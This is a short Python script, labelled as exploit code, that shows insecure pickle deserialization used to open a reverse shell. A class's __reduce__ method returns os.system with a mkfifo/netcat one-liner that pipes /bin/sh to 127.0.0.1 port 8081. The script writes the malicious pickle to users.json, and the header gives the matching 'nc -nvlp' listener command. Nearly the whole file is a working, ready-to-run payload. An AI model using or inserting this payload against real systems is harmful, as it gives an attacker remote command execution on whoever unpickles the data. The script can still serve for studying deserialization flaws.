
'''
exploit code:
    exploiting insecure deserialization to spawn a shell to attacker machine


start listener:
    nc -nvlp 8081
'''


import os
import pickle


def fun(name,password):
    s = {"username":name,"password":password}
    safecode = pickle.dumps(s)
    with open("users.json","wb") as f:
        f.write(safecode)
    return safecode


class exploit(object):
    def __reduce__(self):
        return (os.system,("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 8081 >/tmp/f",))



if __name__ == '__main__':
    e = exploit()
    #u = input("Username : ")
    #p = input("Password : ")
    u = e
    p = "password"
    yo_fun = fun(u,p)
